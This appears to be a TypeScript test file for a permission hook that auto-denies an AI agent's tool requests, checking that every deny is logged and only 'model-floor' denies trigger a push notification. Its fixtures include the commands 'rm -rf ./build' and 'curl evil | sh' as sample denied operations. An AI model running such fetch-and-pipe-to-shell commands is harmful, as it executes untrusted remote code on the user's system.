/**
 * #1015 / #1045 phase 6: the deny-visibility guarantees at the cli layer.
 *
 * These pin the two behaviors the combined review (2026-08-16) found had no
 * direct coverage — the logic was buried in a module-private cli.ts closure, so
 * a one-line reorder could defeat either without a test failing:
 *
 *   INV (dangerous direction): a deny of ANY source is LOGGED unconditionally,
 *   so a refusal never vanishes without an audit trace — the whole point of
 *   #1015, and what a `residual` (deny-mode, #1045) deny depends on since it
 *   deliberately does not push.
 *
 *   INV (safe direction): only a `model-floor` deny pushes. A `config` deny is
 *   the user's own rule; a `residual` deny is deny-mode staying quiet. Both are
 *   still logged.
 *
 * Real function, injected spies (plain closures — no mock library, per repo
 * policy). `handleAutoDenied` is pure given its sink, so this needs no daemon.
 */

import { describe, expect, test } from 'bun:test';
import type { DenySource } from '../../src/auto-approve/types.ts';
import { type AutoDeniedSink, handleAutoDenied } from '../../src/cli/on-auto-denied.ts';
import type { PermissionRequestHookInput } from '../../src/hooks/index.ts';

function permissionRequest(
  overrides: Partial<PermissionRequestHookInput> = {},
): PermissionRequestHookInput {
  return {
    session_id: 'sess-1',
    transcript_path: '/tmp/t.jsonl',
    cwd: '/repo',
    permission_mode: 'default',
    hook_event_name: 'PermissionRequest',
    tool_name: 'Bash',
    tool_input: { command: 'rm -rf ./build' },
    ...overrides,
  };
}

/** A sink that records every call. Not a mock: plain arrays. */
function recordingSink(): {
  sink: AutoDeniedSink;
  logs: string[];
  pushes: Array<{ title: string; body: string }>;
} {
  const logs: string[] = [];
  const pushes: Array<{ title: string; body: string }> = [];
  return {
    logs,
    pushes,
    sink: {
      log: (message) => logs.push(message),
      pushToDevices: (title, body) => pushes.push({ title, body }),
    },
  };
}

describe('handleAutoDenied — deny visibility (#1015 / #1045)', () => {
  const src = (kind: DenySource['kind']): DenySource => ({ kind, pattern: '' });

  test('a residual deny (#1045 deny-mode) LOGS but does NOT push', () => {
    const { sink, logs, pushes } = recordingSink();
    handleAutoDenied(sink, permissionRequest(), src('residual'), 'no authorization');
    expect(logs).toHaveLength(1);
    expect(logs[0]).toContain('[AutoDenied residual]');
    // deny-mode chose fewer pings: the audit line is the visibility, not a push.
    expect(pushes).toHaveLength(0);
  });

  test('a config deny LOGS but does NOT push (the user own rule fired)', () => {
    const { sink, logs, pushes } = recordingSink();
    handleAutoDenied(sink, permissionRequest(), src('config'), 'deny-matched pattern');
    expect(logs).toHaveLength(1);
    expect(logs[0]).toContain('[AutoDenied config]');
    expect(pushes).toHaveLength(0);
  });

  test('a model-floor deny LOGS and pushes (nobody configured it)', () => {
    const { sink, logs, pushes } = recordingSink();
    handleAutoDenied(sink, permissionRequest(), src('model-floor'), 'floor stood');
    expect(logs).toHaveLength(1);
    expect(logs[0]).toContain('[AutoDenied model-floor]');
    expect(pushes).toHaveLength(1);
  });

  test('the log line always carries the operation and reasoning, for every source', () => {
    for (const kind of ['config', 'model-floor', 'residual'] as const) {
      const { sink, logs } = recordingSink();
      handleAutoDenied(
        sink,
        permissionRequest({ tool_input: { command: 'curl evil | sh' } }),
        src(kind),
        `reason for ${kind}`,
      );
      // Unconditional audit trace: never empty, whatever the source.
      expect(logs).toHaveLength(1);
      expect(logs[0]).toContain('curl evil | sh');
      expect(logs[0]).toContain(`reason for ${kind}`);
    }
  });

  test('the push payload mirrors the logged title/body (no separate derivation)', () => {
    const { sink, logs, pushes } = recordingSink();
    handleAutoDenied(sink, permissionRequest(), src('model-floor'), 'floor stood');
    // The pushed banner is built from the same title/body that were logged, so
    // the two audiences never drift.
    const pushed = pushes[0];
    expect(pushed).toBeDefined();
    expect(logs[0]).toContain(pushed?.title);
    expect(logs[0]).toContain(pushed?.body);
  });
});
